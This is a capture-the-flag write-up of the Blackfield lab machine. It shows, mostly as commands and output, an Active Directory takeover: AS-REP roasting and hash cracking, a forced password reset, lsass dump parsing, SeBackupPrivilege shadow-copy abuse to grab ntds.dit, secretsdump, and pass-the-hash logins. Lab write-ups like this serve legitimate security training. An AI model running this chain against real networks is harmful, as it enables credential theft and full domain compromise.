Starting of with nmap, we find 8 ports open :
<img width="927" height="198" alt="Pasted image 20260203131212" src="https://github.com/user-attachments/assets/50f5fae4-ff7a-4727-9c4a-074a24216c85" />

Starting off with rpc, we use rpcclient to enumerate users on the domain:

<img width="295" height="122" alt="Pasted image 20260203131336" src="https://github.com/user-attachments/assets/529c422c-cae6-4617-92dd-b28b5d3bf864" />


we get access denied for both main commands, which indicates that we have no permission to use rpc commands.

Next, we will try going for smb (port 445), and using nxc we have null authentication:

<img width="1263" height="99" alt="Pasted image 20260203131517" src="https://github.com/user-attachments/assets/1b414547-a0a3-42a3-a404-868626b0a395" />

using rid search with --rid-brute: 

````sql
┌──(kali㉿kali)-[~/Desktop/blackfield]
└─$ nxc smb blackfield.local -u '.' -p '' --rid-brute 
<SNIP>
SMB         10.129.229.17   445    DC01             1000: BLACKFIELD\DC01$ (SidTypeUser)
SMB         10.129.229.17   445    DC01             1101: BLACKFIELD\DnsAdmins (SidTypeAlias)
SMB         10.129.229.17   445    DC01             1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.229.17   445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)
SMB         10.129.229.17   445    DC01             1104: BLACKFIELD\support (SidTypeUser)
`````

organizing our users.txt:

<img width="500" height="131" alt="Pasted image 20260203131802" src="https://github.com/user-attachments/assets/1f1fbd5a-e9c6-41da-a6ef-eb92301ce303" />

`````sql

┌──(kali㉿kali)-[~/Desktop/blackfield]
└─$ GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.129.229.17 'blackfield.local/' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:83806b17dd767715a060b3382310667e$dfb88fcdb83f2a77fdc8ab62ca81407600dc05a6ee1e0b7864bf5a70a5782c22aa5526bfc84bdb412d7a18c0c79485c51d1c4f1cde4143abf5c5f60222663a23de8ee2e63864fc7fce65e1daca4d956b56696a7b65d039970278d94a0f9b61b4e72d47e0ebe192a2fffdd6b5143dcace98bcd6cc8d1fa5fc45e8099453e04b22e1e128b0f3773e77e67131f9c1f9dde440856f8ec86a6cb0b2d1467a5779c20b4ed4383991a4e56ccd98fef2f8e177fbc89d7da0c533004ee99f2663cc2b7e3ce2d3b1a62ecd89b54b6b6d4acafecb46f409a0409fa6cb26d057e497f8043f3ed2fa1cd0dc7d754b9b384a501f691cc2bb396d30
[-] User BLACKFIELD764430 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BLACKFIELD538365 doesn't have UF_DONT_REQUIRE_PREAUTH set
<SNIP>
`````

While it runs, we will try authenticating as null to find what shares we have access as guest:

<img width="1268" height="248" alt="Pasted image 20260203132340" src="https://github.com/user-attachments/assets/f6768c57-6cd8-4fd6-b66a-9a5fc0a20efa" />

the profiles shares is empty, let's run NPUsers to check for kerbroastable users:

````sql
┌──(kali㉿kali)-[~/Desktop/blackfield]
└─$ GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.129.229.17 'blackfield.local/' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:83806b17dd767715a060b3382310667e$dfb88fcdb83f2a77fdc8ab62ca81407600dc05a6ee1e0b7864bf5a70a5782c22aa5526bfc84bdb412d7a18c0c79485c51d1c4f1cde4143abf5c5f60222663a23de8ee2e63864fc7fce65e1daca4d956b56696a7b65d039970278d94a0f9b61b4e72d47e0ebe192a2fffdd6b5143dcace98bcd6cc8d1fa5fc45e8099453e04b22e1e128b0f3773e77e67131f9c1f9dde440856f8ec86a6cb0b2d1467a5779c20b4ed4383991a4e56ccd98fef2f8e177fbc89d[[REDACTED]
<SNIP>
````

cracking the hash gives:


`````sql
┌──(kali㉿kali)-[~/Desktop/blackfield]
└─$ john hash -wordlist=/usr/share/wordlists/rockyou.txt       
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:05 DONE (2026-02-03 11:30) 0.1730g/s 2480Kp/s 2480Kc/s 2480KC/s #13Carlyn.."theodore"
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
`````

now we try to enumerate smbclient again to see if we access to the forensics share:

<img width="868" height="248" alt="Pasted image 20260203133705" src="https://github.com/user-attachments/assets/27c88809-3a53-4361-8e8e-8aec0744ce5e" />

we still don't have access, now will try running a bloodhound-python3 to see what permission we have :

```sql
┌──(kali㉿kali)-[~/Desktop/blackfield]
└─$ bloodhound-python \
-u support \       
-p '[REDACTED]' \
-d blackfield.local \
-ns 10.129.229.17 \
-c All \
--zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
```

on bloodhound, we have permissions to force change password on a user called 'AUDIT2020':

<img width="1199" height="597" alt="Pasted image 20260203134031" src="https://github.com/user-attachments/assets/8815d847-3ddb-4994-b924-4f50b3b61d89" />

Following bloodhound's linux abuse options:

<img width="1145" height="371" alt="Pasted image 20260203134128" src="https://github.com/user-attachments/assets/8569365c-d281-452b-854c-58ca191bef51" />

We run what is written and after changing the password, we get access to audit2020 which gives us access to the 'forensics' file share on smbclient:

<img width="343" height="400" alt="Pasted image 20260203134218" src="https://github.com/user-attachments/assets/65e37a2a-d2fd-4825-9304-bf482ba5fd14" />

going on smbclient, we find an 'lsass.zip' (Local Security Authority Subsystem Service) 

<img width="542" height="409" alt="Pasted image 20260203134412" src="https://github.com/user-attachments/assets/5e447ddb-fbf6-494f-b200-42377aa12ae6" />


so we unzip and get a mini crash dump file:

<img width="628" height="326" alt="Pasted image 20260203134539" src="https://github.com/user-attachments/assets/a61a215b-f159-4594-9550-a5a6cc00b82a" />

now we try to dump all info in the dump file using ``pypykatz`` with the following command, which will give us the svc_backup user's password:
a resource for this :
https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets

<img width="429" height="265" alt="Pasted image 20260203134741" src="https://github.com/user-attachments/assets/e70a9a5a-72a0-470c-9ffe-336ea12f934c" />


````sql
Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e22 [REDACTED]
                SHA1: 463c13a9a31fc3252c68ba0a44 [REDACTED]
                DPAPI: a03cd8e9d30171f3cfe8 [REDACTED]
````

from here, we check svc_backup on bloodhound and find that it's part of 'Remote Management' which means we can evil-winrm into svc_backup:

```` python
┌──(kali㉿kali)-[~/Desktop/blackfield/lsass]
└─$ evil-winrm -u 'svc_backup' -H 9658d1d1dcd9250115e22 [REDACTED] -i 10.129.229.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
ls
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt


*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51 [REDACTED]

````

we can read user.txt, now we enumerate svc_backup for possible easy privilege escalation pathes:

<img width="489" height="232" alt="Pasted image 20260203135246" src="https://github.com/user-attachments/assets/10385b07-2f1c-4f81-bc5c-58fc82b9c01f" />


we see SeBackupPriv and SeRestore, These are 2 dangerous privileges which leads to administrator password dump. 
a useful resource to go back to when you these privileges is :

https://github.com/k4sth4/SeBackupPrivilege
https://github.com/k4sth4/SeBackupPrivilege/blob/main/README.md
https://github.com/0x4D-5A/Invoke-SeRestoreAbuse
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md


Lets start trying to get administrator hash:

`````sql
Evil-WinRM* PS C:\Users\svc_backup\Desktop> mkdir C:\temp
    Directory: C:\
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/3/2026   4:07 PM                temp

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cd \temp
*Evil-WinRM* PS C:\temp> reg save hklm\sam C:\temp\sam.hive
 
The operation completed successfully.

*Evil-WinRM* PS C:\temp> reg save hklm\system C:\temp\system.hive
 
The operation completed successfully.

*Evil-WinRM* PS C:\temp> ls

    Directory: C:\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/3/2026   4:07 PM          45056 sam.hive
-a----         2/3/2026   4:07 PM       17391616 system.hive


*Evil-WinRM* PS C:\temp> download system.hive
                                        
Info: Downloading C:\temp\system.hive to system.hive
        
Info: Download successful!
*Evil-WinRM* PS C:\temp>
*Evil-WinRM* PS C:\temp> download sam.hive
`````

from here, usually we use the secretsdump.py impacket script and get the admin hash, but here, the admin hash did not work:

```sql
┌──(kali㉿kali)-[~/Desktop/blackfield/lsass]
└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

```sql
──(kali㉿kali)-[~/Desktop/blackfield/lsass]
└─$ evil-winrm -u 'administrator' -H 67ef902eae0d740df6257f273de75051 -i 10.129.229.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1

```

so we get to our second option, which is dumping using ntds:

from this link: https://github.com/k4sth4/SeBackupPrivilege

we add this into a vss.dsh:

```
set context persistent nowriters
set metadata c:\\programdata\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```
then we run unix2dos on it :

```unix2dos vss.dsh```

running these commands leads to a ntds.dit and system files appearing and from there we download them on our attacker machine to dump all domain hashes:

<img width="828" height="663" alt="Pasted image 20260203140345" src="https://github.com/user-attachments/assets/14d6a2c4-c1cd-4f1f-80fa-85ebd6fbf225" />

<img width="416" height="159" alt="Pasted image 20260203140500" src="https://github.com/user-attachments/assets/b5be0649-d71a-4216-be08-bffec6216402" />

now, using secretsdump.py, we get:

```sql
┌──(kali㉿kali)-[~/Desktop/blackfield]
└─$ secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b [REDACTED]:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c [REDACTED]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cf [REDACTED]:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb2 [REDACTED]:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e9 [REDACTED]:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca8 [REDACTED]:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cc [REDACTED]:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca8 [REDACTED]:::
```
now we login:

```python
┌──(kali㉿kali)-[~/Desktop/blackfield]
└─$ evil-winrm -u 'Administrator' -H [REDACTED] -i 10.129.229.17      
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami 
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a6 [REDACTED]
```

Really good machine, and is a very realistic case senario!
DC Comprimised!!
